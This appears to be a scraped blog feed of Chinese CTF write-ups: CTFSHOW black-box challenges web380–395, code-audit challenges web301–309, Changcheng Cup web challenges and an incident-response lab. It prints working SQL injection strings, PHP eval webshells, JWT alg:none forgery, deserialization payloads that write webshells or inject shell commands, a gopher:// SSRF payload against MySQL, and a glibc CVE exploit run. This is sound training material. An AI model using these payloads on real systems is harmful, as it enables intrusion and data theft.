这里用绿盟D-Eyes主机命令行应急工具，将工具上传到目标机器，cmd输入D-Eyes fs扫盘 如果是多盘路径可以用D-Eyes fs -P C:\\\\,D:\\\\tmp,D:\\\\tools，也可以用D-Eyes.exe ps进行进程扫描，排查异常进程信息 这里我们就使用D-Eyes fs扫盘 这里只找到之前的webshell文件，并没有找到cs可疑文件，原因是部分文件被Windows Defender自动隔离了，需要从隔离区恢复 这里有个问题，如果用的是玄机靶场的话，已隔离威胁那里是找不到这些被隔离的文件，估计是那边默认给删除了，然后没被工作人员发现 所以我用的是下载来的靶场，还原文件之后再扫一遍，排查可疑文件，发现多了两个文件 把SystemTemp.exe和SysnomT.exe放进安恒云沙箱检测（拉取文件到本地之后不要运行） 可以看到这两个文件都是cs控制程序 1flag{SystemTemp.exe,SysnomT.exe} 靶机内部题目答案这是靶机内部答题.exe的答案，不是玄机靶场的答案，玄机的答案在上面各小点里 1234567891011X123567X2023‎年‎11‎月‎6‎日，‏‎4:55:13SystemConfig.phpsyscon.phppassadmin$2023/11/6 4:45:342023/11/6 4:46:072023/11/6 4:46:582023/11/6 4:47:28SystemTemp.exe和SysnomT.exe 参考特别鸣谢 划水但不摆烂：https://mp.weixin.qq.com/s/4UoIw-On-0taB8s0xtjkAw Peterpan.exe：https://blog.csdn.net/administratorlws/article/details/141672688","link":"/posts/Xuanji-CTF-Where-1S-tHe-Hacker/"},{"title":"CTFSHOW | 黑盒测试 web380 - web395","text":"什么是黑盒测试黑盒测试（Black-Box Testing）是一种软件测试方法，测试人员在完全不了解程序内部结构和源代码的情况下，对程序的功能进行测试。测试人员就像普通用户一样，只能通过程序的输入（如点击链接、在输入框中填写数据）来观察其输出，以此判断程序是否存在问题 黑盒测试一般思路在进行黑盒测试时，通常会遵循一个系统性的流程，大致可以分为以下几个关键步骤： 1. 信息收集 (Reconnaissance) 这是所有测试的第一步，目的是尽可能多地了解目标，发现所有可能的攻击入口 目录/文件扫描：使用工具扫描网站可能存在的隐藏目录和文件，如后台登录页面、功能性文件、源码备份等。 前端代码分析：查看网页的HTML、CSS和JavaScript源码（浏览器F12或Ctrl+U），从中寻找隐藏的路径、注释、API接口等。 技术栈识别：通过HTTP响应头、错误信息、网页页脚等判断网站使用的技术（如Apache、Nginx等），有助于我们选择更具针对性的测试方法。 2. 漏洞发现 (Vulnerability Analysis) 收集到足够的信息后，就可以对发现的各个功能点和入口点进行漏洞测试 输入点测试：对所有用户可以输入数据的地方（如URL参数、搜索框、登录框）进行测试，寻找SQL注入、文件包含、命令执行等漏洞。 认证与授权测试：测试登录认证机制是否可以被绕过或破解，例如使用万能密码、暴力破解、伪造JWT等。 逻辑测试：测试应用程序的业务逻辑是否存在缺陷，例如密码重置功能是否可以被滥用、支付流程是否可以被绕过等。 3. 漏洞利用 (Exploitation) 在确认漏洞存在后，构造特定的Payload来利用这个漏洞，以达到我们的最终目的。在CTF中，这个目的通常是读取服务器上的flag文件。在真实的渗透测试中，目的可能是获取服务器的控制权或窃取敏感数据等 题目列表web380扫描网站目录，发现存在两个文件路径 其中第一个大小为0B，可以不用管，直接看第二个路径/page.php 显示打开$id.php失败，我们尝试能不能控制这个参数，输入/page.php?id=1 发现存在文件包含漏洞，直接输入/page.php?id=flag，查看源码得到flag web381打开网站，查看网页源代码，发现相比上一题，这里多了个可疑路径 为了更直观地看到区别，这里把上一题的网页源码放出来 我们访问路径/alsckdfy，成功得到flag web382打开网站，查看网页源代码，跟上一题一样 继续访问路径/alsckdfy，这次打开了一个登录框 尝试用万能密码，成功登录，账号1' or 1=1 #，密码随便写，成功得到flag web383跟上题步骤一样，也是先访问路径/alsckdfy，打开登录框后输入万能密码得到flag web384跟之前一样，来到登录框这里，这次题目有提示，告诉我们密码前2位是小写字母，后三位是数字，很明显是要爆破 因此我们抓取登录的包来尝试爆破，账号用admin，密码可以根据题目要求生成一个字典，python脚本如下 123456789101112131415import stringimport itertoolsfilename = &quot;passwd.txt&quot;letters = string.ascii_lowercase # 小写字母 'abcdefghijklmnopqrstuvwxyz'digits = string.digits # 数字 '0123456789'with open(filename, 'w') as f: for letter_pair in itertools.product(letters, repeat=2): for digit_triplet in itertools.product(digits, repeat=3): password = &quot;&quot;.join(letter_pair) + &quot;&quot;.join(digit_triplet) f.write(password + '\\n')print(f&quot;密码字典生成完毕，已保存到 {filename} 文件中。&quot;) 然后插入到密码处爆破即可，我这里用的yakit，如果是burpsuite同理 最后爆破出来密码是xy123，成功得到flag web385跟之前一样，来到登录框这里，但是这次万能密码不行，题目也没有提示，先尝试扫目录看看 发现有个路径/install，拼接进网站访问看看 然后访问/install/?install，发现成功将管理员密码重置为默认密码 因为不知道默认密码，因此我们尝试进行弱口令爆破 爆破得到密码为admin888，成功得到flag web386扫描目录 访问/install，但是这次显示lock.dat存在 这题相比上一题多了一个/clear.php，访问显示清理完成，我们尝试能不能控制它清理我们指定的文件，猜测参数可能为file，访问/clear.php?file=install/lock.dat，接着再次访问/install，发现lock.dat成功被删除 这时再访问/install/?install重置密码即可，其他步骤跟上题一样，密码依然是admin888，成功得到flag web387扫描目录 发现多了个/debug，访问看看 显示file not exist，猜测可以进行文件包含，输入/debug/?file=/etc/passwd 成功读取到文件，尝试进行日志包含执行命令，UA写入如下内容 1&lt;?php unlink('/var/www/html/install/lock.dat');?&gt; 再次访问/install，发现成功删除lock.dat 其他步骤跟之前一样，密码依然是admin888，成功得到flag web388访问路径/debug，输入/debug/?file=/etc/passwd，但是这次回显方式不一样 由于暂时没有可用的方法，因此我们对后台登录页面进行目录扫描 由前几道题可知，flag就存放在/alsckdfy/check.php里面，但是我们现在暂时没有权限去访问 扫描结果中我们发现路径/alsckdfy/editor/，访问后看到是一个编辑器 存在文件上传页面，我们可以尝试上传一句话木马进去 但是这里对文件上传后缀有限制 我们把木马写好后改后缀为zip，上传文件 1234&lt;?php$a = '&lt;?php eval($_POST[1]);?&gt;';file_put_contents('/var/www/html/1.php',$a);?&gt; 复制路径，然后拼接到/debug/?file=/var/www/html后面 访问路径/1.php，发现成功写入webshell 执行命令tac alsckdfy/check.php得到flag web389访问路径/debug，这次显示权限不足 F12查看cookie，发现多了一个auth验证 网页解密jwt，发现是加密验证，用c-jwt-cracker爆破得到密钥为123456，然后把sub那里的user改为admin 将token复制到auth那里，刷新网页，成功绕过权限限制 剩下的步骤跟上题一样，最后得到flag为 web390方法一（JWT伪造）： 访问路径/debug，依旧是显示权限不足，但是这次密钥爆破不出来了，因此换个方法，把alg改为none，sub改为admin，然后重新编码token，如果后端没有对算法进行验证，那么就可以成功绕过了 用python脚本实现，记得要先用自己jwt解码的payload复制替换dict，然后更改user为admin 123456789101112131415161718192021import jwt# 把自己的payload复制替换dict，然后更改user为admindict = { &quot;iss&quot;: &quot;admin&quot;, &quot;iat&quot;: 1753530361, &quot;exp&quot;: 1753537561, &quot;nbf&quot;: 1753530361, &quot;sub&quot;: &quot;admin&quot;, &quot;jti&quot;: &quot;2b4b35d9ec779539cc1d8c4c8b4659aa&quot;}headers = { &quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot; } jwt_token = jwt.encode(dict, key='',headers=headers, algorithm=&quot;none&quot;) print(jwt_token) 得到token后复制替换网页中的cookie，成功绕过限制 剩下的步骤跟web388一样，成功得到flag 方法二（数字型注入）： 在首页打开灯泡往事，发现有个id存在注入漏洞 输入单引号和双引号都没反应，经过测试，发现是数字型注入，输入page.php?id=-1 union select 1,2,3#，回显位置为2和3 接下来就是把alsckdfy/check.php的内容写到页面即可 1page.php?id=-1 union select 1,2,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)# 然后查看网页源代码得到flag web391方法一（JWT伪造）： 上一题的解法依旧能用，跟之前一样，也是先绕过权限写入日志 然后利用webshell读取flag 方法二（字符型注入）： 在首页打开灯泡往事，发现多了一个标题输入框 经测试存在字符型注入，为单引号，且#被过滤，用-- -代替，回显位置为2和3 把alsckdfy/check.php的内容写到页面 1search.php?title=-1' union select 1,2,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)-- - 查看网页源码即可得到flag web392方法一（JWT伪造）： 跟web390方法一样，不过这次flag位置改变了，不在alsckdfy/check.php里面 而是在根目录/flag里面 方法二（字符型注入）： 跟上题方法一样，不过要读取的文件改成了根目录/flag 1search.php?title=-1' union select 1,2,substr((select load_file('/flag')),1,255)-- - web393方法一（JWT伪造）： 跟上题方法一样，flag也是在根目录 方法二（堆叠注入）： 在首页最底下发现有个搜索引擎 点第一个百度，进去之后发现是百度的搜索页面 修改网页id值，又显示其他页面 因此可以判断这里存储的是网页链接，通过传入的id值查询数据库中的url并进行访问 同时测试发现/search.php?title=1存在堆叠注入，需要先获取数据库的表名和列名再利用，用sqlmap 获取数据库名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET --dbs --batch 获取表名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow --tables --batch 获取列名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow -T link --columns --batch 接着利用堆叠注入插入数据 1search.php?title=1';insert into link(id, name, url) values(11,'a','file:///flag'); 最后访问/link.php?id=11即可 web394方法一（JWT伪造）： 跟web390方法一样，但是flag这次不在根目录/flag了，而是在网站目录的alsckdfy/check.php里面 方法二（堆叠注入）： 跟上题方法一样，但是这次过滤了一些字符，用16进制绕过即可 记得在前面加个0x表示16进制 12search.php?title=1';insert into link(id, name, url)values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870); 最后访问/link.php?id=10即可 查看网页源代码 web395方法一（JWT伪造）： 解法跟上题一样 方法二（堆叠注入）： 解法也是跟上题一样 参考NaecoYes：https://blog.csdn.net/q20010619/article/details/120639310","link":"/posts/ctfshow-black-box-web380-web395/"},{"title":"2025第五届长城杯网络安全大赛初赛 Web方向 WP","text":"Web文曲签学长按Fn进入调试模式，输入#HELP可以查看帮助 输入#LIST可以查看列表，再输入#READ HINT获得提示 在公众号获得提示 双写../进行目录穿越，读取flag EZ_upload打开之后上传一个文件，得到源码 文件移动成功后执行命令 cd /tmp &amp;&amp; tar -xvf ' . $filename.'&amp;&amp;pwd，即进入 /tmp/ 目录，解压上传的文件，然后显示当前路径 关键就是这一行代码，将文件按tar格式解压。我们写入木马到tar文件，然后想办法让其解压到/var/www/html即可 打开本地虚拟机，先创建一个符号链接，指向/var/www/html 1ln -s /var/www/html su 然后往/var/www/html写入一句话木马，命名1.php 接着把符号链接su写入su1.tar 1tar -cvf su1.tar su 然后再把木马写入su2.tar 1tar -cvf su2.tar su/1.php 先上传su1.tar，再上传su2.tar，解压后木马就可以写到/var/www/html目录里面 然后访问1.php，没有报404，说明成功写入 蚁剑连接 根目录找到flllllll1111ag SeRce打开后看到题目源码 123456789&lt;?phphighlight_file(__FILE__);$exp = $_GET[&quot;exp&quot;];if(isset($exp)){ if(serialize(unserialize($exp)) != $exp){ $data = file_get_contents($_POST['filetoread']); echo &quot;File Contents: $data&quot;; }} 要先满足 serialize(unserialize($exp)) != $exp 才可以用 file_get_contents 读取文件。一开始exp还弄得很长，但其实很简单，输入个1就可以，1 并不是合法的序列化格式，unserialize(&quot;1&quot;) 返回 false 并且会触发一个警告，但是 PHP 的 serialize(false) 会返回字符串 &quot;b:0;&quot;，和输入 &quot;1&quot; 不同，因此条件成立 然后filetoread写入文件路径，例如/etc/passwd，POST发送 后面尝试寻找flag找不到，想起来之前见过一个由file_get_contents到任意命令执行的漏洞，上网搜索一番，找到CVE-2024-2961，大概就是GNU C库glibc中iconv()函数的缓冲区溢出漏洞。漏洞会在将字符串转换为ISO-2022-CN-EXT字符集时，导致输出缓冲区最多溢出4字节，从而引发程序崩溃或覆盖内存 参考文章：从多个比赛引发的CVE-2024-2961漏洞学习思考-先知社区 这里用工具来做，地址：https://github.com/ambionics/cnext-exploits 工具下载到虚拟机后，要根据题目修改cnext-exploit.py代码，具体如下 然后执行命令，因为当前用户为www-data，权限很低，所以把文件写到/tmp目录下，/tmp 通常默认可读写，其他目录需确认权限 先读取根目录文件有什么 1python3 cnext-exploit.py https://eci-2ze1g7zvc6cw53q7usqk.cloudeci1.ichunqiu.com:80?exp=1 &quot;ls / &gt; /tmp/1.txt&quot; 直接读取flag发现无法读取，后面查看readflag发现是个程序，且当前用户具备执行权限，可以运行获取flag 1python3 cnext-exploit.py https://eci-2ze1g7zvc6cw53q7usqk.cloudeci1.ichunqiu.com:80?exp=1 &quot;/readflag &gt; /tmp/flag.txt&quot; 返回题目，修改POST读取/tmp/flag.txt即可","link":"/posts/ctf-2025changcheng-web-wp/"},{"title":"CTFSHOW | 代码审计 web301 - web310","text":"什么是代码审计代码审计（Code Audit），也称为白盒测试（White-Box Testing），是一种安全评估方法。与黑盒测试相反，审计人员在拥有应用程序完整源代码的情况下，对程序的逻辑、结构和代码实现进行深入的分析和审查 代码审计一般思路进行代码审计时，通常会结合自动化工具和人工审查，遵循一个由宏观到微观的系统性流程 1. 准备阶段 (Preparation) 这是审计的起点，目的是为后续的深入分析做好准备 理解业务逻辑：首先要通读文档或大致浏览代码，理解这个程序是做什么的、核心功能有哪些 熟悉技术栈和框架：确定项目使用的编程语言（如PHP、Java、Python）、框架（如ThinkPHP、Spring、Django）和关键组件，了解特定框架的已知漏洞和安全特性 部署运行环境：如果条件允许，在本地搭建一个可以运行和调试的测试环境。可以动态地跟踪数据流，验证漏洞，极大地提高审计效率 2. 自动化扫描与手动分析 (Scanning &amp; Manual Review) 这个阶段是审计的核心，通常会从寻找高风险的“入口点”和“危险函数”开始 寻找数据入口（“入”）：首先要定位用户能够控制数据输入的地方，这些是漏洞最有可能产生的地方 全局变量：如PHP中的 $_GET、$_POST、$_COOKIE、$_REQUEST、$_SERVER 等，它们是外部数据进入程序的主要通道 文件操作：关注文件上传、文件读取/写入等功能点 数据库交互：所有与数据库进行增、删、改、查操作的地方 跟踪数据流（“流”）：从找到的入口点开始，跟踪这些外部数据在代码中的传递路径。观察数据在传递过程中是否经过了充分的过滤、净化或编码。这是判断是否存在漏洞的关键 定位危险函数（“出”）：审计的另一个核心是寻找那些能直接导致漏洞的“危险函数”或“敏感操作”，然后逆向回溯，看它们的参数是否能被用户的输入所控制 SQL注入：关注所有执行SQL查询的函数，如 query(), execute() 等，看传入的SQL语句是否由外部输入拼接而成 命令执行：关注 system(), exec(), shell_exec(), passthru() 等能执行系统命令的函数 文件包含/读取：关注 include(), require(), file_get_contents(), readfile() 等函数 反序列化：关注 unserialize() 函数，检查其参数来源 3. 漏洞验证与利用链构造 (Verification &amp; Exploitation) 在发现疑似漏洞后，需要进行验证 编写验证代码 (PoC)：根据代码逻辑，构造特定的输入数据（Payload）来触发漏洞，验证其是否存在以及是否可被利用 构造利用链 (Exploit Chain)：在复杂的场景中，单个漏洞可能无法造成严重危害，此时需要将多个漏洞点（如文件上传 + 文件包含）组合起来，形成一个完整的攻击链，以达到最终目的（如获取服务器权限） 题目列表web301首先下载附件进行分析，可以先看看目录结构 其中admin目录为前端页面目录，不需要分析，因此我们把重点放在assets目录里面 把文件大概看了一下，发现checklogin.php有未过滤的SQL语句，存在SQL注入漏洞 打开题目环境，可以看到一个登录框 有多种方法可以做这道题，咱们一个个分析 方法一：联合注入 分析当前代码，可以看到第17行有个判断语句 其中，strcasecmp是PHP的字符串比较函数，用于比较两个字符串，如果两个字符串相等，则返回0，因此我们通过联合注入查询输出一个值，例如一个包含单个字面量 1 的结果集，程序把1当成了账号在数据库中查询到的密码，因此我们在密码处也输入相同的数字，即可通过验证 12账号：-1' union select 1#密码：1 登录后在首页可以看到flag 方法二：SQL注入写shell 可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag 12账号：-1' union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#密码：1 执行完之后访问1.php，可以看到成功写入 用HackBar执行命令即可，成功读取flag web302这题也是沿用之前的附件，方法跟之前一样 方法一：联合注入 这题把上题checklogin.php的第17行改成了 1if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){ 意思就是只要sds_decode($userpwd)跟$row['sds_password']相等即可通过验证，我们可以先随便输入一个值到$userpwd，然后让其编码之后得到编码值，再让$row['sds_password']通过联合注入输出这个编码值，程序把这个编码值当成了账号在数据库中查询到的密码，最后我们在密码处填入原本的值，经过后台编码后即可通过验证，具体可以看以下操作 我们在目录中寻找sds_decode()函数，发现其位于fun.php 修改一下代码，参数输入1，然后运行 1234567&lt;?phpfunction sds_decode($str){ return md5(md5($str.md5(base64_encode(&quot;sds&quot;))).&quot;sds&quot;);}$a = sds_decode(&quot;1&quot;);echo $a;?&gt; 得到编码结果为 1d9c77c4e454869d5d8da3b4be79694d3 然后我们打开登录框，输入账号密码 12账号：-1' union select 'd9c77c4e454869d5d8da3b4be79694d3'#密码：1 解释一下，输入的1经过sds_decode()函数之后，变成了d9c77c4e454869d5d8da3b4be79694d3，然后我们通过联合注入输出d9c77c4e454869d5d8da3b4be79694d3，程序把这个编码值当成了账号在数据库中查询到的密码，因为我们在登录框密码处输入1，这个密码经过编码后跟我们这个编码值一致，因此就成功通过验证 登录之后在首页得到flag 方法二：SQL注入写shell 跟之前一样，可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag 12账号：-1' union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#密码：1 web303下载附件进行分析，先看看目录结构 checklogin.php这次多了个限制，username长度不能大于6，因此之前的方法用不了 但是登录的检测机制依然不变 1if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){ 继续分析项目文件，发现sds_user.sql里面存在用户信息 用户名是admin，密码是个加密后的值，打开fun.php，可以看到这次贴心给了提示 直接运行代码，得到值为27151b7b1ad51a38ea66b1529cde5ee4，跟上面sql文件里的一样，因此密码就是admin 打开网站登录，账号密码都是admin，进去之后点了一番，发现只有网点一览能点进去 进去之后发现是dpt.php页面 咱们继续回去分析项目文件，发现dpt.php和dptadd.php都存在注入点，且官方也标了注释 dpt.php 1$sql=&quot;select * from sds_dpt order by id;&quot;; dptadd.php 1$sql=&quot;insert into sds_dpt set sds_name='&quot;.$dpt_name.&quot;',sds_address ='&quot;.$dpt_address.&quot;',sds_build_date='&quot;.$dpt_build_year.&quot;',sds_have_safe_card='&quot;.$dpt_has_cert.&quot;',sds_safe_card_num='&quot;.$dpt_cert_number.&quot;',sds_telephone='&quot;.$dpt_telephone_number.&quot;';&quot;; 可惜的是，dpt.php的id并没有办法控制，因此只能从dptadd.php下手，URL拼接路径/dptadd.php，然后通过POST的方式传入参数值，执行SQL注入 查表 1dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())# 1结果为：sds_dpt,sds_fl9g,sds_user 查字段 1dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_fl9g')# 1结果为：flag 查字段值 1dpt_name=1',sds_address=(select flag from sds_fl9g)# 成功得到flag web304这题的代码跟上一题相同，不过多了一个全局WAF检测 123function sds_waf($str){ return preg_match('/[0-9]|[a-z]|-/i', $str);} 但是这个WAF逻辑有问题，只要有任意一个字符匹配成功就会返回1，因此并没有什么用 也是先登录网站，账号和密码都是admin 步骤跟上题一样，只不过表名从sds_fl9g改成了sds_flaag 查表 1dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())# 1结果为：sds_dpt,sds_flaag,sds_user 查字段 1dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_flaag')# 1结果为：flag 查字段值 1dpt_name=1',sds_address=(select flag from sds_flaag)# 成功得到flag web305下载附件分析代码，发现fun.php有个sds_waf()函数，过滤很严格，且应用到了dptadd.php，因此之前的SQL注入行不通 同时发现这题的checklogin.php相比web303多了个Cookie反序列化 分析这个class.php，可以看到有文件写入操作 因此这题的思路就是伪造Cookie，然后执行反序列化漏洞写入webshell payload： 12345678910&lt;?phpclass user{ public $username; public $password; public function __construct($u,$p){ $this-&gt;username=$u; $this-&gt;password=$p; }}var_dump(urlencode(serialize(new user('1.php','&lt;?php eval($_POST[1]);?&gt;')))); 运行结果： 1O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D 把这个序列化结果写入Cookie，路径为/checklogin.php payload： 1Cookie: user=O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D 蚁剑连接webshell，注意要把https改成http 在目录找了一番，没找到flag，猜测flag是在数据库里面，用蚁剑连接数据库 点击添加配置，然后数据库类型选MYSQLI，MYSQLI是MYSQL的升级版，支持更多新特性和更高安全性，官方推荐使用，MYSQL扩展现已废弃 密码在conn.php，但是不知道为什么连不上，后来去网上搜了一下，发现蚁剑那里查看的密码是root，跟题目给的附件不一样 这是附件里面的conn.php 这是蚁剑里面的conn.php 然后在添加配置那里输入账号密码即可 成功找到flag web306下载附件分析代码，发现class.php有个文件写入操作 继续分析，在index.php发现反序列化代码 因此我们可以构造一个利用链执行反序列化操作，在dao.php中发现可利用的类 最终利用链为 1[index.php] unserialize -&gt; [dao.php] dao::__destruct() -&gt; [class.php] log::close() payload： 12345678910111213&lt;?phpclass dao{ private $conn; public function __construct(){ $this-&gt;conn=new log(); }}class log{ public $title='1.php'; public $info='&lt;?php eval($_POST[1]);?&gt;';}$a = new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319 把结果写入Cookie即可，路径是/index.php 然后蚁剑连接webshell，成功找到flag web307下载附件分析代码，发现class.php有个文件写入操作 但是找了一番并没有发现调用closelog()的地方，因此这个方法行不通 继续分析代码，发现dao.php有个命令执行函数 在logout.php发现反序列化代码，且调用了clearCache()函数 虽然logout.php并没有直接包含dao.php，但是包含了service.php，而service.php包含了dao.php，因此可以直接通过dao类调用clearCache()函数 然后控制变量$cache_dir来截断原来的rm命令并执行新的命令，写入webshell到php文件 利用链： 1[/controller/logout.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::clearCache() payload： 123456789101112&lt;?phpclass config{ public $cache_dir = '1; echo &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; 1.php;'; //&quot;$&quot;前加&quot;\\&quot;是为了防止被解析} class dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}$a = new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjE7IGVjaG8gIjw/cGhwIGV2YWwoXCRfUE9TVFsxXSk7Pz4iID4gMS5waHA7Ijt9fQ== 把结果写入Cookie即可，路径是/controller/logout.php，参数是service 然后蚁剑连接webshell，flag在/var/www/html目录 web308下载附件分析代码，发现dao.php的clearCache()函数加了过滤，只能匹配纯英文字符，因此上题的方法在这里行不通 继续分析代码，发现index.php有反序列化代码，且调用了一个函数checkVersion() 查找checkVersion()函数的定义，在dao.php里面 继续分析update_url，在config.php里面可以看到$update_url的定义，是个地址链接 接着再分析checkUpdate()函数的定义 checkUpdate()函数通过cURL发起HTTP请求，因此突破口就是这里，我们可以通过这个打SSRF漏洞 利用链： 1[index.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::checkVersion() 看了一下，发现config.php里面并没有设置mysql密码 因此我们用Gopher协议打无密码的mysql，工具是Gopherus，下载地址：https://github.com/tarunkant/Gopherus 1python2 gopherus.py --exploit mysql 输入以下内容 数据库用户名：root 待执行命令：select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;; 得到结果： 1gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01 如果是直接传参就需要进行URL编码，但是这里是反序列化，解析payload时已经在服务端，因此不需要二次编码 payload： 123456789101112&lt;?phpclass dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}class config{ public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01;';}$a= new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjQ6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDE7Ijt9fQ== 把结果写入Cookie即可，路径是/index.php，参数是service 最后蚁剑连接webshell即可 web309题目提示mysql有密码了，因此上题打无密码msql的方法在这里用不了 附件还是和上题一样，这次可以用Gopher扫描端口试试 123456789101112&lt;?phpclass dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}class config{ public $update_url = 'gopher://127.0.0.1:端口';}$a= new dao();echo base64_encode(serialize($a)); 常见危险端口： 12345678921 FTP22 SSH80 HTTP443 HTTPS3389 RDP1433 MS-SQL Server3306 MySQL6379 Redis9000 PHP-FPM / FastCGI 